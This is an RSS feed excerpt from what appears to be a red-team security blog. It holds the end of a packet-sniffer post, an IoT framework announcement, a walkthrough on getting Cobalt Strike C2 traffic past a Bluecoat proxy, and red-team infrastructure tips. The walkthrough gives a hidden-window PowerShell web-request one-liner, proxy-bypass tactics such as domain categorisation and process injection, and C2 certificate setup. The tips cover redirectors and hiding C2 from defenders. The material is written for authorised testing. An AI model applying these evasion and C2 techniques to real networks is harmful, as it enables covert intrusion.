&lt;pre&gt;&lt;code&gt;class pcap_pkthdr(ctypes.Structure):
    _fields_ = [(&amp;quot;tv_sec&amp;quot;, ctypes.c_long), (&amp;quot;tv_usec&amp;quot;, ctypes.c_long),
    (&amp;quot;caplen&amp;quot;, ctypes.c_uint), (&amp;quot;len&amp;quot;, ctypes.c_uint)]

pcap_pkthdr_p = ctypes.POINTER(pcap_pkthdr)()
packetdata = ctypes.POINTER(ctypes.c_ubyte*65536)()

c = 0
while True:
    if (pcap.pcap_next_ex(pcap_handle, ctypes.byref(pcap_pkthdr_p), ctypes.byref(packetdata)) == 1):
        # our output function pcap_dump()
        pcap.pcap_dump(pcap_dumper_t,pcap_pkthdr_p,packetdata)
        #pkthandler(pcap_pkthdr_p,packetdata)
        c += 1
    if c &amp;gt; PCAP_CAPTURE_COUNT:
        if DEBUG:
            print &amp;quot;* Max packet count reached!&amp;quot;
        break
&lt;/code&gt;&lt;/pre&gt;

&lt;hr /&gt;

&lt;blockquote&gt;
&lt;p&gt;The full repo can be found here:&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;div class=&#34;github-card&#34; data-github=&#34;killswitch-gui/NIX-Sniffer-Examples&#34; data-width=&#34;400&#34; data-height=&#34;153&#34; data-theme=&#34;default&#34;&gt;&lt;/div&gt;
&lt;script src=&#34;//cdn.jsdelivr.net/github-cards/latest/widget.js&#34;&gt;&lt;/script&gt;&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;The full script:&lt;/p&gt;
&lt;/blockquote&gt;

&lt;script src=&#34;https://gist.github.com/killswitch-GUI/ce347f79f5cdb90bd8056100c90e9be2.js&#34;&gt;&lt;/script&gt;
</description>
    </item>
    
    <item>
      <title>Homeland of Things (HoT) Framework Launch</title>
      <link>https://cybersyndicates.com/2017/01/homeland-of-things-framework-launch/</link>
      <pubDate>Tue, 10 Jan 2017 22:15:41 -0500</pubDate>
      
      <guid>https://cybersyndicates.com/2017/01/homeland-of-things-framework-launch/</guid>
      <description>

&lt;p&gt;&lt;a href=&#34;https://homelandofthings.org&#34;&gt;&lt;img src=&#34;https://homelandofthings.org/wp-content/uploads/2016/12/HoT_Cover-232x300.jpg&#34; alt=&#34;alt text&#34; title=&#34;Read the HoT Framework&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&#34;contact&#34;&gt;Contact&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;Author: Daniel West&lt;/li&gt;
&lt;li&gt;Twitter: @reaperb0t&lt;/li&gt;
&lt;li&gt;E-mail: admin@homelandofthings.org&lt;/li&gt;
&lt;li&gt;Website: &lt;a href=&#34;https://homelandofthings.org&#34;&gt;https://homelandofthings.org&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;background&#34;&gt;Background&lt;/h2&gt;

&lt;p&gt;Vulnerabilities, threats, and subsequent risks are inherent with Internet of Things (IoT) devices, which typically reside at the meeting place of critical infrastructure and cyberspace. We present the HoT Framework to promote best practices for all Federal and State, Local, Tribal, and Territorial (SLTT) governments, non-government organizations (NGOs), and the private sector to use as a foundation for the reconnaissance, interrogation, and hardening of IoT nodes that are characterized as existing within both critical and non-critical infrastructure throughout the physical network layer, logical network layer, and cyber-persona layer of cyberspace terrain. In addition, we propose solutions for, public awareness of, and information sharing regarding the vulnerabilities, threats, risks, mitigations, and countermeasures associated with the IoT. The HoT Framework serves to assist Federal and SLTT governments, NGOs, and the private sector in thwarting attacks against their IoT devices and preventing their IoT devices from being used as an attack platform. For the framework to be effective, we need direct support from the DHS, DoD, DOJ, and other Federal agencies. We will also need to establish partnerships with SLTT, NGO, and the private sector (academia and industry) to further enrich and develop the framework using real-world data. We will continue to enrich the framework with technical modules and videos that demonstrate how to conduct the steps within the framework.&lt;/p&gt;

&lt;h3 id=&#34;homelandofthings-org&#34;&gt;HomelandofThings.org&lt;/h3&gt;

&lt;p&gt;Visit &lt;a href=&#34;https://homelandofthings.org&#34;&gt;https://homelandofthings.org&lt;/a&gt; to read the full PDF created using GitBook. We also welcome feedback at admin@homelandofthings.org.&lt;/p&gt;

&lt;h3 id=&#34;table-of-contents&#34;&gt;Table of Contents&lt;/h3&gt;

&lt;p&gt;Total Pages: 43 with Images&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Acknowledgements&lt;/li&gt;
&lt;li&gt;Preface&lt;/li&gt;
&lt;li&gt;The Internet of Things (IoT)&lt;/li&gt;
&lt;li&gt;The IoT in Cyberspace and Cyber-Electromagnetic Activities&lt;/li&gt;
&lt;li&gt;Vulnerabilities in the IoT&lt;/li&gt;
&lt;li&gt;Threats to the IoT&lt;/li&gt;
&lt;li&gt;Risks to Homeland Security

&lt;ul&gt;
&lt;li&gt;Cybersecurity and Homeland Security Doctrine Review&lt;/li&gt;
&lt;li&gt;Homeland Cybersecurity Risk Assessment&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;The Homeland of Things Framework

&lt;ul&gt;
&lt;li&gt;Reconnaissance and Interrogation to Detect Vulnerabilities and Adversary Presence within the Physical Network Layer&lt;/li&gt;
&lt;li&gt;Reconnaissance and Interrogation to Detect Vulnerabilities and Adversary Presence within the Logical Network Layer&lt;/li&gt;
&lt;li&gt;Reconnaissance and Interrogation to Detect Vulnerabilities and Adversary Presence within the Cyber-Persona Layer&lt;/li&gt;
&lt;li&gt;Mitigating Vulnerabilities and Protecting Against Adversary Attacks within the Physical Network Layer&lt;/li&gt;
&lt;li&gt;Mitigating Vulnerabilities and Protecting Against Adversary Attacks within the Logical Network Layer&lt;/li&gt;
&lt;li&gt;Mitigating Vulnerabilities and Protecting Against Adversary Attacks within the Cyber-Persona Layer&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;References&lt;br /&gt;&lt;/li&gt;
&lt;/ol&gt;
</description>
    </item>
    
    <item>
      <title>Egressing Bluecoat with CobaltStike &amp; Let&#39;s Encrypt</title>
      <link>https://cybersyndicates.com/2016/12/egressing-bluecoat-with-cobaltstike-letsencrypt/</link>
      <pubDate>Sun, 04 Dec 2016 21:39:41 -0500</pubDate>
      
      <guid>https://cybersyndicates.com/2016/12/egressing-bluecoat-with-cobaltstike-letsencrypt/</guid>
      <description>

&lt;p&gt;&lt;iframe width=&#34;640&#34; height=&#34;360&#34; src=&#34;https://www.youtube.com/embed/cgwfjCmKQwM?rel=0&#34; frameborder=&#34;0&#34; allowfullscreen&gt;&lt;/iframe&gt;
This post is a bit different than other posts I have done in the past, the material I will talking about directly helped me overcome an extremely challenging engagement. When it comes to egress protections I personally am not often met with an environment that I can&amp;rsquo;t get out of. It&amp;rsquo;s not about the skill level of the operator, just the techniques, and processes that we employee as a team and we stick to ensure successful engagements.&lt;/p&gt;

&lt;h2 id=&#34;background&#34;&gt;Background&lt;/h2&gt;

&lt;p&gt;During a recent engagement, we followed many of the tips I mentioned in my last post: &lt;a href=&#34;https://cybersyndicates.com/2016/11/top-red-team-tips/&#34;&gt;https://cybersyndicates.com/2016/11/top-red-team-tips/&lt;/a&gt; including using separate C2 transports for each stage of the engagement. Unfortunately, during initial access we were able to obtain DNS callbacks, but never able to transition to our active OP&amp;rsquo;s team server via HTTP or HTTP(S).&lt;/p&gt;

&lt;h3 id=&#34;identifying-a-proxy&#34;&gt;Identifying a Proxy&lt;/h3&gt;

&lt;p&gt;Once you identified issues with obtaining a callback via HTTP or HTTP(S) you should immediately start thinking:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Proxy (web proxy)&lt;/li&gt;
&lt;li&gt;HTTP(S) interception&lt;/li&gt;
&lt;li&gt;Domain Categorization&lt;/li&gt;
&lt;li&gt;Domain life / Rating&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;While you could have other issues like HIPS stopping injection, process with no token context. I have also seen people use elevated (SYSTEM) context and attempting to spawn with no way to authenticate to the proxy.&lt;/p&gt;

&lt;p&gt;The first step it to troubleshoot and see if that user can even authenticate to the proxy. I often use PowerShell to easily check to see if I can reach common sites, here is an example:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;powershell.exe -w hidden -command $wc = New-Object System.Net.Webclient; $wc.Headers.Add(&#39;User-Agent&#39;,&#39;Mozilla/5.0 (Windows NT 6.1; WOW64;Trident/7.0; AS; rv:11.0) Like Gecko&#39;); $wc.proxy= [System.Net.WebRequest]::DefaultWebProxy; $wc.proxy.credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; $wc.downloadstring(&#39;http://google.com/&#39;)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Once you have confirmed that the token context or process that your currently in has the ability to authenticate you can move forward. If not try the following:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Target a user process and inject into that to operate within.&lt;/li&gt;
&lt;li&gt;Target specific process: exporer.exe, chrome.exe, ie.exe&lt;/li&gt;
&lt;li&gt;Move to a different beacon, often proxies will expire connections. I have been in situations where the beacon would go stale every 30 or so mins.&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;egress-constraints&#34;&gt;Egress Constraints&lt;/h3&gt;

&lt;p&gt;Once you have confirmed that you are dealing with a proxy, you will have to start troubleshooting the issues. The three things we will cover: Domain Age, Domain Categorization, HTTPS Certs.&lt;/p&gt;

&lt;h4 id=&#34;domain-age&#34;&gt;Domain Age&lt;/h4&gt;

&lt;p&gt;In most cases domain age does not come into play. While it’s very rare we see an environment with that level of egress protections, its totally reasonable to be doing. Websense can perform this, bluecoat uses WebFilter and domain age of 14 days or less are often blocked by these devices.&lt;/p&gt;

&lt;p&gt;To test for this I often take an older domain that I know is blog personally owned site. These are often only a few years old and they will help you potentially rule out the domain age. You could follow many of the steps and may have to retool to a domain maybe you owned for a good bit. I know I hold about 5 domains myself for testing so domain age &lt;em&gt;should&lt;/em&gt; not be a major issue.&lt;/p&gt;

&lt;h4 id=&#34;domain-categorization&#34;&gt;Domain Categorization&lt;/h4&gt;

&lt;p&gt;We often out of habit attempt to get our domain categorized before we start and engagement. This process is scary easy and we often only go to a few different locations. Some safe bets to target:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Government&lt;/li&gt;
&lt;li&gt;IT Tech&lt;/li&gt;
&lt;li&gt;Finance&lt;/li&gt;
&lt;li&gt;News&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Try to avoid personal tags, streaming service etc, those can often be blocked to prevent bandwidth use or they don&amp;rsquo;t want their employees spending all day on Hulu. You can easily clone a site with:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;wget –mk www.example.com
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I suggest taking the time and finding something close with the keywords that you are trying to target for domain categorization. Once you have the website setup submit it to the following:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://sitereview.bluecoat.com/sitereview.jsp&#34;&gt;https://sitereview.bluecoat.com/sitereview.jsp&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://community.opendns.com/domaintagging/&#34;&gt;https://community.opendns.com/domaintagging/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.brightcloud.com/tools/change-request-url-categorization.php&#34;&gt;https://www.brightcloud.com/tools/change-request-url-categorization.php&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://archive.lightspeedsystems.com&#34;&gt;https://archive.lightspeedsystems.com&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://support.forcepoint.com/KBArticle?id=How-To-Submit-Uncategorized-Sites&#34;&gt;https://support.forcepoint.com/KBArticle?id=How-To-Submit-Uncategorized-Sites&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&#34;domain-certification&#34;&gt;Domain Certification&lt;/h4&gt;

&lt;p&gt;The last thing that plays into the domain overall score is if it contains a proper SSL cert. For a long time, up till recently to obtain an SSL cert you had to go through a register that would properly issue you a cert and prove you owned the domain etc. Many levels of authenticity exist for SSL certs. So this added a small level of complexity for most testers due to the monetary investment as well as the time it generally took to be issued the cert.&lt;/p&gt;

&lt;p&gt;Three types of certs we will see; Wildcard, Multi-Domain, and EV (Extended Validation)/SAN certs. While different proxies likely filter and block on the type of cert, I would imagine most environments will allow properly signed certs through. In my case, I was using the self-signed certificate from CobaltStrike and being blocked. Using a self-signed cert not only looks highly suspicious but also could be easily blocked. We will be using Let&amp;rsquo;s Encrypt next to help build that domain ranking, score and hopefully find a path out.&lt;/p&gt;

&lt;p&gt;Its general worth just using the PowerShell one liner to request your C2 HTTPS site. Letting you see a returned a status code or HTML that fingerprint the Proxy you are being blocked by. In my case I was able to see the Bluecoat ProxySG page displayed for “blocked content”.&lt;/p&gt;

&lt;p&gt;The last thing we will test is the ability to reach a “sample” site that would match your parameters. Using PowerShell once again we will attempt to find a site that has the correct domain categorization and contains a Let&amp;rsquo;s Encrypt Cert. In my case I used Cybersyndicates.com since I host my site with a LetsEncypt cert and I have IT / Computer Security Rating with Bluecoat.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;powershell.exe -w hidden -command $wc = New-Object System.Net.Webclient; $wc.Headers.Add(&#39;User-Agent&#39;,&#39;Mozilla/5.0 (Windows NT 6.1; WOW64;Trident/7.0; AS; rv:11.0) Like Gecko&#39;); $wc.proxy= [System.Net.WebRequest]::DefaultWebProxy; $wc.proxy.credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; $wc.downloadstring(&#39;https://cybersyndicates.com/&#39;)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This worked since Bluecoat trusted the root chain of the cert which is signed by DST. We now know a bit of intel of what is stopping us and how we can circumvent this.&lt;/p&gt;

&lt;h2 id=&#34;cobaltstrike-integration-with-let-s-encypt-process&#34;&gt;CobaltStrike Integration with Let&amp;rsquo;s Encypt Process&lt;/h2&gt;

&lt;p&gt;Once you have found a combination that works its time move forward with setting up your C2 Server. The process is a bit long manually, so follow along and at the end, I will provide an easy to use setup script for this entire process.&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;Install the following:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Sudo apt-get install keytool openssl git apache2 -y
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Start Apache2&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;service apache2 start
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Check to ensure Apache2 is listening on 80, and the return value should 1. *note: this is important as Let&amp;rsquo;s Encrypt will use this to verify you own the domain.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;lsof -nPi | grep -i apache | grep -c &amp;quot;:80 (LISTEN)&amp;quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;In my case with Ubuntu images allow port 80,443 through the firewall:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;ufw allow 80/tcp
ufw allow 443/tcp
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Install Let&amp;rsquo;s Encrypt:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;git clone https://github.com/certbot/certbot /opt/Let&#39;s Encrypt
cd /opt/Let&#39;s Encrypt
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Run Let&amp;rsquo;s Encrypt ($domain is you domain name): *note: I found the &amp;ndash;register-unsafely-without-email flag hidden in the documentation, which will allow you easily run this script without any prompts from Let&amp;rsquo;s Encrypt&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;./Let&#39;s Encrypt-auto --apache -d $domain -n --register-unsafely-without-email --agree-tos
cat /etc/Let&#39;s Encrypt/live/$domain/fullchain.pem
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Following some documentation from CobaltStrike (&lt;a href=&#34;https://www.cobaltstrike.com/help-malleable-c2&#34;&gt;https://www.cobaltstrike.com/help-malleable-c2&lt;/a&gt;) we find we will need a Java KeyStore, to do this will first need make our PKCS12 certs.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;cd /etc/Let&#39;s Encrypt/live/$domain
openssl pkcs12 -export -in fullchain.pem -inkey privkey.pem -out $domainPkcs -name $domain -passout pass:$password
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Building java keystore via keytool:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;keytool -importkeystore -deststorepass $password -destkeypass $password -destkeystore $domainStore -srckeystore $domainPkcs -srcstoretype PKCS12 -srcstorepass $password -alias $domain
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Make a directory for https in CS dir, and copy the new store:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;mkdir ~/CobaltStrike/https
cp $domainStore ~/CobaltStrike/https/
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Setup CobaltStrike Malleable C2 Profile to use SSL cert:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;wget https://raw.githubusercontent.com/rsmudge/Malleable-C2-Profiles/master/normal/amazon.profile --no-check-certificate -O amazon.profile
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Add the following lines to the new amazon profile with the settings you built the keystore with:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;https-certificate {
set keystore &amp;quot;domain.store&amp;quot;;
set password &amp;quot;mypassword&amp;quot;;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&#34;cobaltstrike-integration-with-let-s-encypt-automated&#34;&gt;CobaltStrike Integration with Let&amp;rsquo;s Encypt Automated&lt;/h2&gt;

&lt;p&gt;Of course, I had to do this on MANY domains so I automated the process so you don’t make mistakes and this whole process takes less that 2 mins top!&lt;/p&gt;

&lt;script src=&#34;https://gist.github.com/killswitch-GUI/bdf00b3bc7035abf7d42c516933d0cac.js&#34;&gt;&lt;/script&gt;
</description>
    </item>
    
    <item>
      <title>6 Red Team Infrastructure Tips</title>
      <link>https://cybersyndicates.com/2016/11/top-red-team-tips/</link>
      <pubDate>Wed, 30 Nov 2016 16:08:28 -0500</pubDate>
      
      <guid>https://cybersyndicates.com/2016/11/top-red-team-tips/</guid>
      <description>

&lt;h2 id=&#34;tl-dr&#34;&gt;TL;DR&lt;/h2&gt;

&lt;ol&gt;
&lt;li&gt;CLI Logging of All Operator Terminal&lt;/li&gt;
&lt;li&gt;Restricted Payload Delivery&lt;/li&gt;
&lt;li&gt;Separate Servers / C2 Phases for all Stages of an Engagement&lt;/li&gt;
&lt;li&gt;Always Use Redirectors in Front of Core C2&lt;/li&gt;
&lt;li&gt;Full Session / Metadata Network Capture on Redirectors and C2&lt;/li&gt;
&lt;li&gt;Never Share C2 IOC’s&lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

&lt;p&gt;As some of you may know I made a huge transition recently from my former team ATD (Adaptive Threat Division) at Veris Group to Sony’s internal Red Team. This was, of course, a major move, but the opportunity to help develop and stand up that capability was hard to pass up. This was a dream for me and to do it with some extremely dedicated and talented coworkers is always a bonus.&lt;/p&gt;

&lt;p&gt;This brings me to our subject, recently I had put a ton of time into thinking out red team architecture and wanted to share. This will cover security and tips for a successful engagement. While some of this may seem “excessive”, you have to take this type of work very serious as you will be holding the keys to the kingdom of your company or target! With data dumps like shadow brokers apparently owning the equation group (Not here to say that’s true or valid data) nothing is safe and we must reduce our risk and only expose limited attack surface just as we help our clients.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;1. CLI Logging of All Operator Terminals:&lt;/strong&gt;
You may be thinking why in world would I need this level of fidelity and data? Well, a really good buddy of mine &lt;a href=&#34;https://www.sixdub.net/&#34;&gt;@sixdub&lt;/a&gt; let me on to this a year or so ago for a potential integrity and data preservation method for potential discrepancies or de-conflictions. I’m taking this opportunity to push this forward on some of our first OP’s. Below is a tool built for just the right solution:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Find the setup here:&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;div class=&#34;github-card&#34; data-github=&#34;killswitch-gui/lterm&#34; data-width=&#34;400&#34; data-height=&#34;153&#34; data-theme=&#34;default&#34;&gt;&lt;/div&gt;
&lt;script src=&#34;//cdn.jsdelivr.net/github-cards/latest/widget.js&#34;&gt;&lt;/script&gt;&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Here is a small example of global terminal logging:&lt;/p&gt;
&lt;/blockquote&gt;

&lt;iframe src=&#34;https://player.vimeo.com/video/194050322?autoplay=1&amp;loop=1&#34; width=&#34;640&#34; height=&#34;400&#34; frameborder=&#34;0&#34; webkitallowfullscreen mozallowfullscreen allowfullscreen&gt;&lt;/iframe&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;2. Restricted Payload Delivery :&lt;/strong&gt;
This is something I have not done in a bit and generally only required during specific circumstances. I’m here to tell you that we may be doing it all wrong, after an incident where a payload was spread via a secondary source and made its way out of scope you will want to take this advice. Ensure that not only are there clearly defined scoping and external IP space but take the time to setup your C2 to only allow communication to your payload stagger to trusted sources. A couple ways you can go about this which is some really cool work from @bluescreenofjeff is using Apache mod_rewrite rules. In a combination of the mod rewrite edits you can raise the sophistication level of uncovering your C2.   &lt;a href=&#34;https://bluescreenofjeff.com/tags#mod_rewrite&#34;&gt;bluescreenofjeff mod_rewrite series&lt;/a&gt; has some great ways we can get super paranoid during setup. Using rules for OS, mobile hits (how you want to handle these), browser based (using an HTA like this for IE:  &lt;a href=&#34;https://github.com/killswitch-GUI/PenTesting-Scripts/blob/master/ProxyAware-ps-Stager.hta&#34;&gt;HTA-Example&lt;/a&gt;) and even handling user redirection not matching our C2 Profile we use. One of the main concerns is we want to ensure that our payload just does not stage to external IP space that may out of scope or even an IR toolset, this will increase the duration and sophistication to a long living C2 architecture.




    
    
        
        
        
        
        
    


    
    
    
    
    

    
    
        
    
    



    
    &lt;div style=&#34;display:flex;justify-content:center;align-items:center&#34;&gt;
        &lt;div style=&#34;height: 100%; width: 100%&#34;&gt;
            &lt;p&gt;
                &lt;img src=&#34;https://cybersyndicates.com/image/apache_mod_overview.png&#34; alt=&#34;VPS with apache mod_rewrite&#34;/&gt;
            &lt;/p&gt;
        &lt;/div&gt;
    &lt;/div&gt;
    
&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Image Credit: &lt;a href=&#34;https://bluescreenofjeff.com/2016-03-22-strengthen-your-phishing-with-apache-mod_rewrite-and-mobile-user-redirection/&#34;&gt;https://bluescreenofjeff.com/2016-03-22-strengthen-your-phishing-with-apache-mod_rewrite-and-mobile-user-redirection/&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;3. Separate Servers / C2 Phases for all Stages of an Engagement:&lt;/strong&gt;
This tip is crucial during the construction of your engagements infrastructure. Splitting up your C2 will provide you flexibility, stealth and ability to roll C2 on the unfortunate day you get burnt. So, what do I mean by “splitting” up the Infrastructure? Well in some cases you may be conducting a OP with one team server, but during a red team, all phases of the OP should be separated.
&lt;iframe width=&#34;560&#34; height=&#34;315&#34; src=&#34;https://www.youtube.com/embed/4w7krkqxRck&#34; frameborder=&#34;0&#34; allowfullscreen&gt;&lt;/iframe&gt;
This is a bit of safeguard against burning all of your C2 at one time as well as providing redundancy, and a separate team server for coworkers. I have found splitting this up into three core components as seems to be quite effective! Below is a basic layout and beginning of what our team arch should look like:&lt;br /&gt;




    
    
        
        
        
        
        
    


    
    
    
    
    

    
    
        
    
    



    
    &lt;div style=&#34;display:flex;justify-content:center;align-items:center&#34;&gt;
        &lt;div style=&#34;height: 100%; width: 100%&#34;&gt;
            &lt;p&gt;
                &lt;img src=&#34;https://cybersyndicates.com/image/seprate_vps.jpg&#34; alt=&#34;seprate vps red team&#34;/&gt;
            &lt;/p&gt;
        &lt;/div&gt;
    &lt;/div&gt;
    
&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;4. Always Use Redirectors in Front of Core C2:&lt;/strong&gt;
This is not always enforced depending on engagement and type of operation you are conducting. Heck, I have broken this rule in all types of scenarios, for phishing or another quick testing. The reality of the matter your core C2 servers or “Team Servers” if you are a CS user are HVA (High-Value Assets) and need to be secured like one. This mean full-scale firewall to only allow the ports used for an engagement (80,443,8080) and IPTable rules for allowed IP space for ssh and inbound connections from our redirectors. While our redirectors will come and go we need to trust our core C2 servers, and if they are exposed at any given time all it takes is a patient attacker to gain access. Lastly, never re-use a redirector. NEVER CROSS STREAMS!




    
    
        
        
        
        
        
    


    
    
    
    
    

    
    
        
    
    



    
    &lt;div style=&#34;display:flex;justify-content:center;align-items:center&#34;&gt;
        &lt;div style=&#34;height: 100%; width: 100%&#34;&gt;
            &lt;p&gt;
                &lt;img src=&#34;https://cybersyndicates.com/image/vps_redirectors.jpg&#34; alt=&#34;red team redirctors&#34;/&gt;
            &lt;/p&gt;
        &lt;/div&gt;
    &lt;/div&gt;
    
&lt;/p&gt;

&lt;p&gt;If you have the time I highly suggest looking at CobaltStikes video on setting up redirectors as this will most likely apply to multiple situations or tools. In most cases, i have found during my setup that Socat was reliable and solid as a brick. I even started asking around and it seems it&amp;rsquo;s the go too. Here is the Socat example from CobaltStrike, the video below is a great walk through of this process:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;socat TCP4-LISTEN:80,fork TCP4:54.197.3.16:80
&lt;/code&gt;&lt;/pre&gt;

&lt;iframe width=&#34;560&#34; height=&#34;315&#34; src=&#34;https://www.youtube.com/embed/PyJu_LYosts&#34; frameborder=&#34;0&#34; allowfullscreen&gt;&lt;/iframe&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;5. Full Session / Metadata Network Capture on Redirectors and C2:&lt;/strong&gt;
I know you going to question this! Well, its necessary after recent events with cobalt strike and Metasploit our tools are being targeted! I know asking for full PCAP on our redirectors will not be possible for most, while ill be shooting for a certain retention time on core architecture we need at least PCAP metadata (IP SRC/DST, PORT SRC/DST). This can be a simple text file, but this will give you something to go back to god forbid you have multiple redirectors and need to find an originating point of a callback. Something as simple as this can give you a ton of insight if an incident does happen. But in today&amp;rsquo;s age maybe we should be shooting for full pcap? What do you think? It could be as simple as this:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ sudo tcpdump -n &amp;gt; test.txt
&lt;/code&gt;&lt;/pre&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;6. Never Share C2 IOC’s!&lt;/strong&gt; Let’s be honest we have gone far out of our way to stand up and build solid and secure architecture, let’s not get its all burnt with one mistake. When we hear IOC we think malware etc, in this case, we mean IOC’s that would link or unravel our C2 easily without a full blown investigation.&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;Do not share domain names by using sub-domains across any part of the separate core C2 servers.&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Register all domain with different POCs or only use private registration. With new tools like Whoisology.com doing reverse register name lookups takes seconds. Within minutes the blue team will be able to use hard indicators to destroy your foothold. Take a look at the ease of finding connected domains:
&lt;iframe src=&#34;https://player.vimeo.com/video/194049240?autoplay=1&amp;loop=1&#34; width=&#34;640&#34; height=&#34;372&#34; frameborder=&#34;0&#34; webkitallowfullscreen mozallowfullscreen allowfullscreen&gt;&lt;/iframe&gt;&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;We setup three servers for Phishing, Active OP’s, and Long Term and we put them all in the same geographical region and /24 IP-space. Well, that was an easy win for the blue team! Please use separate geographical regions and IP-space for redirectors and core C2 servers.&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;I have seen this done often and it&amp;rsquo;s generally not an issue, but if you use the same C2 transport for all three separate servers you may have just burnt it all. Let’s say I use CS-HTTP stagers and the blue team catches my phishing server. That team is going to write custom signatures to ID that sort of traffic. Take the time use DNS/HTTP/HTTPS at all stages to give them a treat&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Following the last recommendation CS supports malleable C2 profiles, use them they work trust me! With that, you need to be careful if your target is Government related think twice with using streaming services. Use this in good taste or write custom ones that your target will most likely use, and think about what they may block.&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Going to host a payload? Take the time and stand up a custom droplet and web server to host payloads that will be used for phishing or lateral movement. This way you&amp;rsquo;re not opening your core C2 to more potential attack surface. Go ahead and look at my baseline apache server, you’re not going to get far.&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;





    
    
        
        
        
        
        
    


    
    
    
    
    

    
    
        
    
    



    
    &lt;div style=&#34;display:flex;justify-content:center;align-items:center&#34;&gt;
        &lt;div style=&#34;height: 100%; width: 100%&#34;&gt;
            &lt;p&gt;
                &lt;img src=&#34;https://cybersyndicates.com/image/vps_full_setup.jpg&#34; alt=&#34;red team redirctors&#34;/&gt;
            &lt;/p&gt;
        &lt;/div&gt;
    &lt;/div&gt;
    


&lt;hr /&gt;

&lt;p&gt;Any questions or concerns do not hastate to ask, as always hope I was able to share some basic tips for your next engagement.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>EmPyre Collection Operations</title>
      <link>https://cybersyndicates.com/2016/06/empyre-collection-opperations/</link>
      <pubDate>Tue, 21 Jun 2016 20:14:14 +0000</pubDate>
      
      <guid>https://cybersyndicates.com/2016/06/empyre-collection-opperations/</guid>
      <description>

&lt;p&gt;



    
    
        
        
        
        
        
